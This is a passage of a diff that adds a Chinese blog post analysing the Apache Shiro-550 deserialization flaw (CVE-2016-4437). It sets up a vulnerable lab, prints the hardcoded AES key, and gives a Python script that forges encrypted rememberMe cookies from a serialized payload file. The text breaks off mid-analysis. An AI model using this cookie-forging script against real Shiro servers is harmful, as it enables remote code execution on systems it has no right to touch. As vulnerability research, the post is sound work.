@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Shiro-550漏洞分析(CVE-2016-4437) - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="Shiro-550漏洞分析(CVE-2016-4437)" />
+<meta property="og:description" content="对shiro-550漏洞的简单分析及poc利用分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/shiro_550_analysis/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2021-09-08T19:38:00+08:00" />
+<meta property="article:modified_time" content="2021-09-08T19:38:00+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="Shiro-550漏洞分析(CVE-2016-4437)"/>
+<meta name="twitter:description" content="对shiro-550漏洞的简单分析及poc利用分析"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/shiro_550_analysis/" /><link rel="prev" href="https://clq0.top/scientific_adfree_networking/" /><link rel="next" href="https://clq0.top/shiro_721_analysis/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Shiro-550漏洞分析(CVE-2016-4437)",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/shiro_550_analysis\/"
+        },"genre": "posts","keywords": "Java, shiro","wordcount":  3131 ,
+        "url": "https:\/\/clq0.top\/shiro_550_analysis\/","datePublished": "2021-09-08T19:38:00+08:00","dateModified": "2021-09-08T19:38:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Shiro-550漏洞分析(CVE-2016-4437)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/vulnerability_analysis/"><i class="far fa-folder fa-fw"></i>Vulnerability_analysis</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-08">2021-09-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3131 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;<span id="/shiro_550_analysis/" class="leancloud_visitors" data-flag-title="Shiro-550漏洞分析(CVE-2016-4437)">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞简介">漏洞简介</a></li>
+    <li><a href="#影响版本">影响版本</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a>
+      <ul>
+        <li><a href="#无cc依赖">无cc依赖</a></li>
+        <li><a href="#有cc依赖">有cc依赖</a></li>
+      </ul>
+    </li>
+    <li><a href="#reference">Reference</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>对shiro-550漏洞的简单分析及poc利用分析</p>
+<h2 id="漏洞简介">漏洞简介</h2>
+<p>官方issues：<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener noreffer">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
+<p>Apache Shiro框架提供了记住我（RememberMe）的功能，功能表现为关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行<code>序列化、AES加密、Base64编码</code>操作。服务器端识别身份解密处理cookie的流程则是： <code>获取rememberMe cookie -&gt;base64 解码-&gt;AES解密（加密密钥硬编码）-&gt;反序列化（未作过滤处理）</code>。</p>
+<p>但是AES加密的密钥Key被硬编码在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化漏洞。如果在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段，那么就可能存在此漏洞。</p>
+<h2 id="影响版本">影响版本</h2>
+<p>Apache Shiro &lt;= 1.2.4</p>
+<h2 id="环境搭建">环境搭建</h2>
+<p>直接使用shiro官方的samples-web进行分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ git clone https://github.com/apache/shiro.git
+$ <span class="nb">cd</span> ./shiro
+<span class="c1"># 恢复到shiro-1.2.4版本</span>
+$ git checkout shiro-root-1.2.4
+</code></pre></td></tr></table>
+</div>
+</div><p>打包前需要对<code>./shiro/samples/web/pom.xml</code>进行一些修改：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml">     <span class="c">&lt;!--  需要设置编译的版本 --&gt;</span>
+     <span class="nt">&lt;properties&gt;</span>
+        <span class="nt">&lt;maven.compiler.source&gt;</span>1.6<span class="nt">&lt;/maven.compiler.source&gt;</span>
+        <span class="nt">&lt;maven.compiler.target&gt;</span>1.6<span class="nt">&lt;/maven.compiler.target&gt;</span>
+    <span class="nt">&lt;/properties&gt;</span>
+...
+    <span class="nt">&lt;dependencies&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>jstl<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="c">&lt;!--  这里需要将jstl设置为1.2，添加如下一行 --&gt;</span>
+            <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span> 
+            <span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+.....
+        <span class="c">&lt;!--  这里添加CC3.2.1库是为了方便演示有依赖的反序列化RCE --&gt;</span>
+        <span class="nt">&lt;dependency&gt;</span>
+            <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
+            <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
+            <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
+            <span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
+        <span class="nt">&lt;/dependency&gt;</span>
+<span class="nt">&lt;dependencies&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>导入IDEA，使用JDK1.8，然后打包成war包，丢到tomcat访问</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>正常登录成功后，服务器返回给我们的cookie：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="err">Cookie: JSESSIONID=2DB46C11B68E9356AD7CD85D13939320; rememberMe=0d9UNwC8IBfeiQ0UW0AhezGrGbyithE7MSIt0eZkmaDbWE8h41Y6XvTgXctE7LGOjhFHA9wRF5/VpMtFv+7yn43aFu/GYEWc571cdu2brSPmZnX4YXEqe0iMWnBul6UM4xvvYdp0f3zKhoutCsLhqU4pOrggF4mngscltFgEbdBSYURiz1namedUwm/LUDxvWzA7Afnfj6RjcOAFQpiq+ddlJY+I/C+ibKzAlR7x4uwgMJIQl5x/C62hu1+HZeQM/D1DY8boVQUPvYppET12o1iZG+uzy+Fa9o/A0fEFViPz3DAWJCfpypsD+PAdrHkJ3+sZXUJ1zYyAvPr5ZjBADKoIKrFL61ijngfmupke7yDSNv/KIjGYNzjhUNIw1d35RBjqnx2hYvn7vV3ewNARK2uWKNP/ankncQcbgrhFbyln+FIMWLat/Vx5SQm2IKlopi8B4mBgt2WkLdWJtJlb6ySK7X2qprJN8ZT+awoUOFjlU+EeO+1fGFDxrD4qJpr9
+</span></code></pre></td></tr></table>
+</div>
+</div><p>后端会对rememberMe的值进行base64解码然后进行AES解密，我们来跟一下源码</p>
+<p>可以看到在<code>shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class</code>中看到硬编码了CIPHER_KEY</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractRememberMeManager</span>
+    <span class="kd">implements</span> <span class="n">RememberMeManager</span>
+<span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">log</span> <span class="o">=</span> <span class="n">LoggerFactory</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">AbstractRememberMeManager</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">DEFAULT_CIPHER_KEY_BYTES</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="o">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>继续往下看，可以看到encrypt和decrypt方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">encrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">serialized</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">value</span> <span class="o">=</span> <span class="n">serialized</span><span class="o">;</span>
+    <span class="n">CipherService</span> <span class="n">cipherService</span> <span class="o">=</span> <span class="n">getCipherService</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">cipherService</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ByteSource</span> <span class="n">byteSource</span> <span class="o">=</span> <span class="n">cipherService</span><span class="o">.</span><span class="na">encrypt</span><span class="o">(</span><span class="n">serialized</span><span class="o">,</span> <span class="n">getEncryptionCipherKey</span><span class="o">());</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="n">byteSource</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+<span class="o">}</span>
+
+<span class="kd">protected</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">decrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">encrypted</span><span class="o">)</span> <span class="o">{</span>
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">serialized</span> <span class="o">=</span> <span class="n">encrypted</span><span class="o">;</span>
+    <span class="n">CipherService</span> <span class="n">cipherService</span> <span class="o">=</span> <span class="n">getCipherService</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">cipherService</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ByteSource</span> <span class="n">byteSource</span> <span class="o">=</span> <span class="n">cipherService</span><span class="o">.</span><span class="na">decrypt</span><span class="o">(</span><span class="n">encrypted</span><span class="o">,</span> <span class="n">getDecryptionCipherKey</span><span class="o">());</span>
+        <span class="n">serialized</span> <span class="o">=</span> <span class="n">byteSource</span><span class="o">.</span><span class="na">getBytes</span><span class="o">();</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">serialized</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中 CipherService 是个接口，而实现这个接口的是一个抽象类 JcaCipherService，继续跟进，在initNewCipher下断点，调试可以看到使用了AES/CBC/PKCS5Padding模式加密，继续调试发现<code>random = this.ensureSecureRandom();</code>，使用随机数生成16字节的 iv，然后使用<code>encrypt(plaintext, key, ivBytes, generate)</code>生成数据经过base64编码作为rememberMe的值</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193438939.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193438939.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193438939.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193438939.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193438939.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193438939.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193438939.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193438939.jpg" />
+    </a>
+<p>iv是随机数生成的，解密时iv值直接从密文的前16字节获取，然后利用得到的iv和硬编码的key来进行解密密文：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">shiro-core-1.2.4-sources.jar!/org/apache/shiro/crypto/JcaCipherService.java
+</code></pre></td></tr></table>
+</div>
+</div><a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193450644.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193450644.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193450644.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193450644.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193450644.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193450644.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193450644.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193450644.jpg" />
+    </a>
+<p>然后也在加密方法中看到了对应实现：</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193457380.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193457380.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193457380.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193457380.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193457380.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193457380.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193457380.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193457380.jpg" />
+    </a>
+<p>那我们只要知道了硬编码的key值，就可以构造任意数据传入了</p>
+<p>到这里只是该漏洞利用的前提，我们继续分析漏洞点</p>
+<p>既然我们知道了iv就是rememberMe值base64解码后的前16个字节，我们先来解码正常的rememberMe值看看：</p>
+<p>加密解密脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># pip install pycrypto</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="k">def</span> <span class="nf">encode_rememberme</span><span class="p">():</span>
+    <span class="n">popen</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="s1">&#39;shiro550.ser&#39;</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+    <span class="n">BS</span>   <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span>
+    <span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span> <span class="o">+</span> <span class="p">((</span><span class="n">BS</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BS</span><span class="p">)</span> <span class="o">*</span> <span class="nb">chr</span><span class="p">(</span><span class="n">BS</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BS</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">key</span>  <span class="o">=</span>  <span class="s2">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
+    <span class="n">mode</span> <span class="o">=</span>  <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span>
+    <span class="n">iv</span>   <span class="o">=</span>  <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">bytes</span>
+    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">mode</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+    <span class="n">file_body</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">popen</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="n">base64_ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">file_body</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">base64_ciphertext</span>
+
+<span class="k">def</span> <span class="nf">decode_rememberme_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fpr</span><span class="p">:</span>
+        <span class="n">key</span>  <span class="o">=</span>  <span class="s2">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
+        <span class="n">mode</span> <span class="o">=</span>  <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span>
+        <span class="n">byte</span> <span class="o">=</span> <span class="n">fpr</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">IV</span>   <span class="o">=</span> <span class="n">byte</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>
+        <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">mode</span><span class="p">,</span> <span class="n">IV</span><span class="o">=</span><span class="n">IV</span><span class="p">)</span>
+        <span class="n">remember_bin</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">byte</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
+    <span class="k">return</span> <span class="n">remember_bin</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="c1"># payload = encode_rememberme()</span>
+    <span class="c1"># with open(&#34;cookie.txt&#34;, &#34;w&#34;) as fpw:</span>
+    <span class="c1">#     print(&#34;rememberMe={}&#34;.format(payload.decode()), file=fpw)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;decode&#34;</span><span class="p">,</span> <span class="s1">&#39;wb+&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fpw</span><span class="p">:</span>
+        <span class="n">fpw</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decode_rememberme_file</span><span class="p">(</span><span class="s2">&#34;encode&#34;</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193518762.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193518762.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193518762.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193518762.jpg"
+            data-srcset="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193518762.jpg, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193518762.jpg 1.5x, https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193518762.jpg 2x"
+            data-sizes="auto"
+            alt="https://gitee.com/leonsec/images/raw/master/(null)-20210908193518762.jpg" />
+    </a>
+<p>可以看到明显的<code>aced</code>序列化流的标识，所以分析到这里可以猜测，rememberMe的值存储的是序列化数据，有序列化就一定有反序列化操作，接下来看看后端接收到rememberMe值后对其进行的操作</p>
+<p>在<code>shiro-core-1.2.4-sources.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>的<code>getRememberedPrincipals</code>函数，对rememberMe值进行操作，在这里下断点调试</p>
+<a class="lightgallery" href="https://gitee.com/leonsec/images/raw/master/%28null%29-20210908193531766.jpg" title="https://gitee.com/leonsec/images/raw/master/(null)-20210908193531766.jpg" data-thumbnail="https://gitee.com/leonsec/images/raw/master/(null)-20210908193531766.jpg">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
